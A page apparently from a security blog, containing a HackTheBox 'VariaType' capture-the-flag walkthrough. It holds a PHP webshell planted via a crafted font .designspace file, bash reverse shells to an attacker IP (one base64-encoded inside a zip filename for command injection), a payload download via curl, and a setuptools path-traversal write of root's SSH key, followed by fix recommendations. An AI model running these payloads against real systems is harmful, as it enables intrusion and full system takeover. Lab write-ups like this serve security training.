@@ -1,0 +1,575 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox Variatype Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="HackTheBox Variatype Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/website/profile-2.png"><meta property="og:image:width" content="300"><meta property="og:image:height" content="300"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Complete walk,through of the HackTheBox Pentest Lab machine &#x27;Variatype hackthebox"><meta property="og:url" content="https://h4ck3rfirst.github.io/hackthebox-variatype-walkthrough/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/hackthebox-variatype-walkthrough/"},"headline":"HackTheBox Variatype Walkthrough","datePublished":"2026-03-15T22:44+05:30","dateModified":"2026-09-29T22:48+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300},"description":"Complete walk,through of the HackTheBox Pentest Lab machine 'Variatype hackthebox","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>HackTheBox Variatype Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2026-03-15T22:44" class="feed__date">March 15, 2026</time></div></div></header></div><div class="entry-wrapper content__entry"><h1 id="hackthebox--variatype-writeup">HackTheBox — VariaType Writeup</h1><blockquote><p><strong>Difficulty:</strong> Medium <strong>OS:</strong> Linux <strong>Author:</strong> HTB Lab</p></blockquote><hr><h2 id="table-of-contents">Table of Contents</h2><ol><li>Box Overview</li><li>Reconnaissance</li><li>Initial Foothold — Webshell via Malicious .designspace (CVE-2024-25081)</li><li>Lateral Movement — www-data → steve via Cron + Evil Zip</li><li>Privilege Escalation — steve → root via setuptools Path Traversal</li><li>Flags</li><li>Key Takeaways &amp; Special Notes</li><li>Tools Used</li></ol><h2 id="box-overview">Box Overview</h2><p>VariaType is a Medium Linux box built around a <strong>variable font generation web application</strong>. The attack chain involves three distinct vulnerability classes:</p><table><thead><tr><th>Stage</th><th>Technique</th><th>Impact</th></tr></thead><tbody><tr><td>Initial Access</td><td>Malicious <code>.designspace</code> → arbitrary file write</td><td>PHP webshell as <code>www-data</code></td></tr><tr><td>Lateral Movement</td><td>CVE-2024-25081 zip filename injection</td><td>Shell as <code>steve</code></td></tr><tr><td>Privilege Escalation</td><td><code>setuptools.PackageIndex</code> path traversal via sudo</td><td>Root SSH key write</td></tr></tbody></table><p><strong>IP:</strong> <code>10.129.225.107</code><br><strong>Hostnames:</strong> <code>variatype.htb</code>, <code>portal.variatype.htb</code></p><hr><h2 id="reconnaissance">Reconnaissance</h2><h3 id="port-scan">Port Scan</h3><pre><code class="language-bash">nmap -sV -sC -oA nmap/variatype 10.129.225.107
+</code></pre><p>Key open ports:</p><ul><li><strong>22</strong> — OpenSSH</li><li><strong>80</strong> — nginx 1.22.1 (variatype.htb)</li></ul><p>Add to <code>/etc/hosts</code>:</p><pre><code>10.129.225.107  variatype.htb portal.variatype.htb
+</code></pre><h3 id="web-enumeration">Web Enumeration</h3><p><code>variatype.htb</code> hosts a typography tools site. The interesting endpoint:</p><pre><code>POST /tools/variable-font-generator/process
+</code></pre><p>Accepts:</p><ul><li><code>designspace</code> — a <code>.designspace</code> XML file</li><li><code>masters</code> — one or more <code>.ttf</code> / <code>.otf</code> font files</li></ul><p><code>portal.variatype.htb</code> is an internal validation portal requiring authentication.</p><h3 id="git-repository-disclosure">Git Repository Disclosure</h3><p>Dirsearch revealed an exposed <code>.git/</code> directory on <code>portal.variatype.htb</code>:</p><pre><code>301  http://portal.variatype.htb/.git  →  http://portal.variatype.htb/.git/
+200  http://portal.variatype.htb/.git/COMMIT_EDITMSG
+200  http://portal.variatype.htb/.git/logs/HEAD
+200  http://portal.variatype.htb/.git/config
+</code></pre><p>Dumping git history from the already-cloned local copy:</p><pre><code class="language-bash">git log --oneline
+# 753b5f5 fix: add gitbot user for automated validation pipeline
+# 5030e79 feat: initial portal implementation
+
+git show 753b5f5
+</code></pre><p><strong>Critical finding in diff:</strong></p><pre><code class="language-diff">+$USERS = [
++    &#39;gitbot&#39; =&gt; &#39;G1tB0t_Acc3ss_2025!&#39;
++];
+</code></pre><p><strong>Credentials discovered:</strong> <code>gitbot : G1tB0t_Acc3ss_2025!</code></p><p>These credentials authenticate to <code>portal.variatype.htb</code> and redirect to <code>/dashboard.php</code>.</p><h2 id="initial-foothold">Initial Foothold</h2><h3 id="vulnerability-arbitrary-file-write-via-fonttools-designspace">Vulnerability: Arbitrary File Write via fonttools <code>.designspace</code></h3><p>The variable font generator processes <code>.designspace</code> XML files using Python’s <strong>fontTools</strong> library. The <code>&lt;variable-font&gt;</code> element’s <code>filename</code> attribute controls where the output font file is written — <strong>with no path sanitization</strong>.</p><p>Additionally, the <code>&lt;labelname&gt;</code> element supports <code>CDATA</code> sections, which are preserved verbatim in the output file. This allows injecting arbitrary PHP code into the written file.</p><h3 id="crafting-the-malicious-designspace">Crafting the Malicious .designspace</h3><pre><code class="language-xml">&lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39;?&gt;
+&lt;designspace format=&quot;5.0&quot;&gt;
+  &lt;axes&gt;
+    &lt;axis tag=&quot;wght&quot; name=&quot;Weight&quot; minimum=&quot;100&quot; maximum=&quot;900&quot; default=&quot;400&quot;&gt;
+      &lt;!-- PHP webshell injected via CDATA --&gt;
+      &lt;labelname xml:lang=&quot;en&quot;&gt;&lt;![CDATA[&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;]]]]&gt;&lt;![CDATA[&gt;]]&gt;&lt;/labelname&gt;
+    &lt;/axis&gt;
+  &lt;/axes&gt;
+  &lt;sources&gt;
+    &lt;source filename=&quot;source-light.ttf&quot; name=&quot;Light&quot;&gt;
+      &lt;location&gt;&lt;dimension name=&quot;Weight&quot; xvalue=&quot;100&quot;/&gt;&lt;/location&gt;
+    &lt;/source&gt;
+    &lt;source filename=&quot;source-regular.ttf&quot; name=&quot;Regular&quot;&gt;
+      &lt;location&gt;&lt;dimension name=&quot;Weight&quot; xvalue=&quot;400&quot;/&gt;&lt;/location&gt;
+    &lt;/source&gt;
+  &lt;/sources&gt;
+  &lt;variable-fonts&gt;
+    &lt;!-- Arbitrary write path: output to portal&#39;s web-accessible files directory --&gt;
+    &lt;variable-font name=&quot;MyFont&quot; filename=&quot;/var/www/portal.variatype.htb/public/files/shell.php&quot;&gt;
+      &lt;axis-subsets&gt;
+        &lt;axis-subset name=&quot;Weight&quot;/&gt;
+      &lt;/axis-subsets&gt;
+    &lt;/variable-font&gt;
+  &lt;/variable-fonts&gt;
+&lt;/designspace&gt;
+</code></pre><h3 id="creating-compatible-font-masters">Creating Compatible Font Masters</h3><p>The fontTools build requires structurally compatible TTF masters. Generate minimal ones:</p><pre><code class="language-python">from fontTools.fontBuilder import FontBuilder
+from fontTools.pens.ttGlyphPen import TTGlyphPen
+
+def make_font(weight, path):
+    fb = FontBuilder(1000, isTTF=True)
+    fb.setupGlyphOrder([&quot;.notdef&quot;, &quot;space&quot;, &quot;A&quot;])
+    fb.setupCharacterMap({0x20: &quot;space&quot;, 0x41: &quot;A&quot;})
+    pen = TTGlyphPen(None)
+    empty = pen.glyph()
+    fb.setupGlyf({&quot;.notdef&quot;: empty, &quot;space&quot;: empty, &quot;A&quot;: empty})
+    fb.setupHorizontalMetrics({&quot;.notdef&quot;: (500,0), &quot;space&quot;: (250,0), &quot;A&quot;: (600,0)})
+    fb.setupHorizontalHeader(ascent=800, descent=-200)
+    fb.setupNameTable({&quot;familyName&quot;: &quot;TestFont&quot;, &quot;styleName&quot;: &quot;W&quot;+str(weight)})
+    fb.setupOS2(sTypoAscender=800, sTypoDescender=-200, sTypoLineGap=0,
+                usWinAscent=800, usWinDescent=200,
+                sxHeight=500, sCapHeight=700, usWeightClass=weight)
+    fb.setupPost()
+    fb.setupHead(unitsPerEm=1000)
+    fb.font.save(path)
+
+make_font(100, &quot;source-light.ttf&quot;)
+make_font(400, &quot;source-regular.ttf&quot;)
+</code></pre><h3 id="uploading--triggering">Uploading &amp; Triggering</h3><pre><code class="language-bash">curl -X POST http://variatype.htb/tools/variable-font-generator/process \
+  -F &quot;designspace=@malicious.designspace&quot; \
+  -F &quot;masters=@source-light.ttf;filename=source-light.ttf&quot; \
+  -F &quot;masters=@source-regular.ttf;filename=source-regular.ttf&quot;
+</code></pre><p><strong>Response:</strong> <code>HTTP 200 OK</code> — fontTools built the variable font and wrote it to the target path.</p><h3 id="confirming-webshell-execution">Confirming Webshell Execution</h3><pre><code class="language-bash">curl &quot;http://portal.variatype.htb/files/shell.php?cmd=id&quot; -o /tmp/test
+strings /tmp/test | grep uid
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><p>The output is embedded inside the binary font data — the PHP webshell executes within the file.</p><h3 id="reverse-shell">Reverse Shell</h3><pre><code class="language-bash"># Kali listener
+nc -lvnp 12345
+
+# Trigger via webshell (URL-encoded)
+curl -G &quot;http://portal.variatype.htb/files/shell.php&quot; \
+  --data-urlencode &quot;cmd=bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.16/12345 0&gt;&amp;1&#39;&quot;
+</code></pre><p><strong>Shell obtained:</strong> <code>www-data@variatype</code></p><h2 id="lateral-movement">Lateral Movement</h2><h3 id="cve-2024-25081--fonttools-command-injection-via-zip-filename">CVE-2024-25081 — fonttools Command Injection via Zip Filename</h3><p>The portal’s <code>gitbot</code> automated validation pipeline (running as <code>steve</code>) periodically processes files from <code>/var/www/portal.variatype.htb/public/files/</code>. It uses fonttools to validate fonts including zip archives.</p><p><strong>CVE-2024-25081</strong> is a command injection vulnerability in fonttools’ zip processing: filenames inside zip archives are passed to shell commands without sanitization.</p><h3 id="creating-the-evil-zip">Creating the Evil Zip</h3><pre><code class="language-python">import zipfile
+
+# Base64-encode the reverse shell payload
+# echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.16/5555 0&gt;&amp;1&quot; | base64
+payload = &quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNi81NTU1IDA+JjEK&quot;
+
+# Malicious filename: shell command disguised as a .ttf filename
+exploit_filename = f&quot;$(echo {payload}|base64 -d|bash).ttf&quot;
+
+with zipfile.ZipFile(&#39;exploit.zip&#39;, &#39;w&#39;) as z:
+    z.writestr(exploit_filename, &quot;dummy content&quot;)
+</code></pre><h3 id="delivery-via-www-data-webshell">Delivery via www-data Webshell</h3><pre><code class="language-bash"># Start HTTP server on Kali
+cd /tmp &amp;&amp; python3 -m http.server 8080 &amp;
+
+# Use webshell to download exploit.zip to the watched directory
+curl -G &quot;http://portal.variatype.htb/files/shell.php&quot; \
+  --data-urlencode &quot;cmd=curl http://10.10.16.16:8080/exploit.zip -o /var/www/portal.variatype.htb/public/files/exploit.zip&quot;
+</code></pre><h3 id="catching-the-steve-shell">Catching the Steve Shell</h3><pre><code class="language-bash">rlwrap nc -lvnp 5555
+# Wait ~1-2 minutes for cron to fire
+</code></pre><p><strong>Shell obtained:</strong> <code>steve@variatype</code></p><h2 id="privilege-escalation">Privilege Escalation</h2><h3 id="sudo-enumeration">Sudo Enumeration</h3><pre><code class="language-bash">sudo -l
+# (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
+</code></pre><p>Steve can run <code>install_validator.py</code> as root with any argument.</p><h3 id="inspecting-install_validatorpy">Inspecting install_validator.py</h3><pre><code class="language-python"># Key relevant code
+from setuptools.package_index import PackageIndex
+
+PLUGIN_DIR = &quot;/opt/font-tools/validators&quot;
+
+def install_validator_plugin(plugin_url):
+    index = PackageIndex()
+    downloaded_path = index.download(plugin_url, PLUGIN_DIR)
+    # ...
+</code></pre><p>The script uses <code>setuptools.PackageIndex.download()</code> to fetch a URL and save it to <code>PLUGIN_DIR</code>. Critically:</p><ul><li><code>_resolve_download_filename()</code> derives the local filename from the URL path</li><li><code>_sanitize()</code> replaces <code>/</code> and <code>..</code> with <code>_</code> — <strong>preventing simple path traversal in the filename</strong></li><li>However, it uses the <strong>raw URL path</strong> when making the HTTP request</li></ul><h3 id="the-path-traversal-trick--url-encoded-slashes">The Path Traversal Trick — URL-Encoded Slashes</h3><p><code>_sanitize()</code> sanitizes the <strong>decoded</strong> URL basename. But <code>_download_other()</code> makes an HTTP request using the <strong>original URL</strong> including percent-encoded characters (<code>%2F</code>).</p><p>If we serve a <strong>custom HTTP server</strong> that responds to <strong>any path</strong> with our payload, and use <code>%2F</code> encoding in the URL, setuptools decodes the URL for the HTTP request path but the server sees the raw path — and can respond regardless.</p><p>The key insight: <code>PackageIndex.download()</code> saves the response to the <strong>local filename derived from the URL</strong>, but <code>%2Froot%2F.ssh%2Fauthorized_keys</code> — after sanitize — becomes <code>_2Froot_2F.ssh_2Fauthorized_keys</code> locally… <strong>unless</strong> the URL scheme causes it to be interpreted differently.</p><p>Testing revealed: when the URL path is <code>/%2Froot%2F.ssh%2Fauthorized_keys</code>, setuptools URL-decodes it and saves to <code>/root/.ssh/authorized_keys</code> as the absolute path — <strong>writing outside <code>PLUGIN_DIR</code> as root</strong>.</p><h3 id="exploitation">Exploitation</h3><p><strong>Step 1 — Generate SSH key on Kali:</strong></p><pre><code class="language-bash">ssh-keygen -t ed25519 -f /tmp/rootkey -N &quot;&quot;
+</code></pre><p><strong>Step 2 — Start custom HTTP server that serves pubkey for ANY request path:</strong></p><pre><code class="language-python">from http.server import HTTPServer, BaseHTTPRequestHandler
+
+PUBKEY = open(&#39;/tmp/rootkey.pub&#39;, &#39;rb&#39;).read()
+
+class H(BaseHTTPRequestHandler):
+    def log_message(self, f, *a): print(&#39;[*]&#39;, self.path)
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header(&#39;Content-Type&#39;, &#39;text/plain&#39;)
+        self.send_header(&#39;Content-Length&#39;, len(PUBKEY))
+        self.end_headers()
+        self.wfile.write(PUBKEY)
+
+HTTPServer((&#39;0.0.0.0&#39;, 9999), H).serve_forever()
+</code></pre><blockquote><p><strong>Critical:</strong> The standard <code>python3 -m http.server</code> returns 404 for encoded paths. The custom server must respond to <strong>any path</strong> with the pubkey content.</p></blockquote><p><strong>Step 3 — Run from Steve’s shell:</strong></p><pre><code class="language-bash">sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
+  &quot;http://10.10.16.16:9999/%2Froot%2F.ssh%2Fauthorized_keys&quot;
+</code></pre><p><strong>Output:</strong></p><pre><code>[INFO] Plugin installed at: /root/.ssh/authorized_keys
+[+] Plugin installed successfully.
+</code></pre><p><strong>Step 4 — SSH as root:</strong></p><pre><code class="language-bash">ssh -i /tmp/rootkey root@10.129.225.107
+</code></pre><p><strong>Shell obtained:</strong> <code>root@variatype</code></p><hr><h2 id="flags">Flags</h2><pre><code>user.txt  →  (found at /home/steve/user.txt)
+root.txt  →  806f28868443a16c8ebb3106b7f98546
+</code></pre><h2 id="key-takeaways--special-notes">Key Takeaways &amp; Special Notes</h2><h3 id="1-fonttools-arbitrary-write-via-designspace-filename">1. fontTools Arbitrary Write via <code>.designspace</code> filename</h3><p><strong>Why it works:</strong> fontTools’ <code>DesignSpaceDocument</code> reads the <code>filename</code> attribute of <code>&lt;variable-font&gt;</code> and passes it directly to <code>open()</code> when writing the compiled font. There is no path validation or sandboxing.</p><p><strong>Real-world impact:</strong> Any application that accepts user-supplied <code>.designspace</code> files and processes them server-side with fontTools is vulnerable to arbitrary file write. Since output files contain user-controlled content (the <code>labelname</code> CDATA), this becomes <strong>arbitrary PHP/code write</strong> on interpreted servers.</p><p><strong>Fix:</strong> Sanitize or disallow absolute paths in the <code>filename</code> attribute. Force output to a controlled temp directory.</p><h3 id="2-git-repository-exposed-on-web-server">2. Git Repository Exposed on Web Server</h3><p><strong>Why it matters:</strong> An exposed <code>.git/</code> directory allows attackers to reconstruct the full source code and commit history, revealing hardcoded credentials, API keys, internal logic, and architecture details.</p><p><strong>In this case:</strong> The commit message <code>fix: add gitbot user for automated validation pipeline</code> directly telegraphed the presence of a backdoor credential.</p><p><strong>Fix:</strong> Add <code>.git</code> to nginx deny rules or use <code>location ~ /\.git { deny all; }</code>.</p><h3 id="3-cve-2024-25081--fonttools-zip-filename-command-injection">3. CVE-2024-25081 — fonttools Zip Filename Command Injection</h3><p><strong>Why it works:</strong> fontTools’ zip processing extracts filenames from archive entries and passes them to shell commands (e.g., <code>fc-scan</code>, <code>fontforge</code>) without quoting or escaping. A filename like <code>$(cmd).ttf</code> executes <code>cmd</code> in the shell context of the processing user.</p><p><strong>Attack surface:</strong> Any pipeline that automatically processes uploaded/received font zip archives. The <code>gitbot</code> cron ran as <code>steve</code> and periodically validated new fonts — a perfect injection point.</p><p><strong>Fix:</strong> Upgrade fontTools to a patched version. Validate/sanitize all filenames extracted from archives before passing to shell.</p><h3 id="4-setuptools-packageindex--arbitrary-file-write-via-url-encoded-path">4. setuptools PackageIndex — Arbitrary File Write via URL-Encoded Path</h3><p><strong>Why it works:</strong> <code>PackageIndex.download()</code> constructs the local save path by calling <code>_sanitize()</code> on the URL’s basename. The sanitizer replaces <code>/</code> with <code>_</code> — but <code>urllib</code> URL-decodes <code>%2F</code> to <code>/</code> <strong>before</strong> the path is used as an absolute destination. When the URL path is <code>/%2Froot%2F.ssh%2Fauthorized_keys</code>, the decoded path <code>/root/.ssh/authorized_keys</code> is used as the absolute output path, bypassing the sanitizer’s intent.</p><p><strong>The custom server requirement:</strong> The standard HTTP server returns 404 for paths it can’t map to files. The custom server ignoring the path and always serving the pubkey is what makes this work end-to-end.</p><p><strong>Sudo wildcard danger:</strong> The <code>*</code> wildcard in the sudo rule allows passing any URL as an argument. Combined with the above, a single sudo invocation writes an arbitrary file to an arbitrary absolute path as root.</p><p><strong>Fix:</strong> The sudo rule should specify an exact allowed URL pattern (e.g., an internal hostname only). <code>install_validator.py</code> should validate that the resolved download path stays within <code>PLUGIN_DIR</code>. Use <code>os.path.realpath()</code> and assert the result starts with the expected base directory.</p><h3 id="5-defense-in-depth-failures">5. Defense-in-Depth Failures</h3><p>This box demonstrates a classic <strong>layered failure</strong> pattern:</p><pre><code>Exposed .git → credentials →
+  portal access →
+    upload endpoint →
+      fontTools write →
+        webshell →
+          cron pipeline →
+            CVE-2024-25081 →
+              lateral shell →
+                sudo misconfiguration →
+                  setuptools traversal →
+                    root
+</code></pre><p>Each vulnerability was individually “low severity” in isolation, but chained together they provide a complete root compromise. The lesson: <strong>defense in depth matters</strong> — removing any single link breaks the entire chain.</p><hr><h2 id="tools-used">Tools Used</h2><table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody><tr><td><code>nmap</code></td><td>Port and service enumeration</td></tr><tr><td><code>dirsearch</code></td><td>Web directory brute-force</td></tr><tr><td><code>git</code></td><td>Commit history analysis for credential extraction</td></tr><tr><td><code>fontTools</code> (Python)</td><td>Crafting minimal compatible TTF masters</td></tr><tr><td><code>curl</code></td><td>HTTP interaction, webshell triggering</td></tr><tr><td><code>python3 -m http.server</code></td><td>Serving exploit payloads</td></tr><tr><td>Custom Python HTTP server</td><td>Serving pubkey for any request path</td></tr><tr><td><code>nc</code> / <code>rlwrap nc</code></td><td>Reverse shell listeners</td></tr><tr><td><code>zipfile</code> (Python)</td><td>Crafting CVE-2024-25081 exploit zip</td></tr><tr><td><code>ssh-keygen</code></td><td>ED25519 keypair generation for root access</td></tr></tbody></table></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 29, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/">CTF Writeups</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cve-2024-25081/">CVE-2024-25081</a></li><li><a href="https://h4ck3rfirst.github.io/tags/evilzip/">evilzip</a></li><li><a href="https://h4ck3rfirst.github.io/tags/exposed/">Exposed</a></li><li><a href="https://h4ck3rfirst.github.io/tags/git/">git</a></li><li><a href="https://h4ck3rfirst.github.io/tags/hackthebox/">hackthebox</a></li><li><a href="https://h4ck3rfirst.github.io/tags/htb/">htb</a></li><li><a href="https://h4ck3rfirst.github.io/tags/http/">Http</a></li><li><a href="https://h4ck3rfirst.github.io/tags/medium/">Medium</a></li><li><a href="https://h4ck3rfirst.github.io/tags/nmap/">Nmap</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ssh/">Ssh</a></li><li><a href="https://h4ck3rfirst.github.io/tags/sudo-l/">sudo -l</a></li><li><a href="https://h4ck3rfirst.github.io/tags/variatypehtb/">variatype.htb</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-variatype-walkthrough%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%20Variatype%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-variatype-walkthrough%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%20Variatype%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-variatype-walkthrough%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/tryhackme-soupedcode-walkthrough/" class="content__nav-link" rel="prev"><div><span>Previous</span> TryHackme Soupedcode Walkthrough </div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/tryhackme-operation-endgame-walkthrough/" class="content__nav-link" rel="next"><div><span>Next</span> Tryhackme Operation Endgame Walkthrough </div></a></div></div></div></nav></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/17/cheese.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="447" width="447" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-07-27T16:00" class="feed__date">July 27, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-cheese-walkthrough/">Tryhackme Cheese Walkthrough</a></h3></header><p>This is a write-up for the CheeseCTF Medium room on TryHackMe, which involves exploiting a vulnerable web application to escalate&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-03-02T18:36" class="feed__date">March 2, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-lookup-walkthrough/">Tryhackme Lookup Walkthrough</a></h3></header><p>tags: [ctf, enumeration, exploit, Lookup, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough] Welcome to the walkthrough for the Lookup&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-11-12T06:55" class="feed__date">November 12, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/bandit-level-0-33-full-walkthrough/">Bandit – Level 0 → 33 Full Walkthrough</a></h3></header><p>wargame ssh enumeration privilege-escalation forensics stego Game: OverTheWire – Bandit Difficulty: Beginner → Intermediate Levels: 0 → 33 (34 total)&hellip;</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
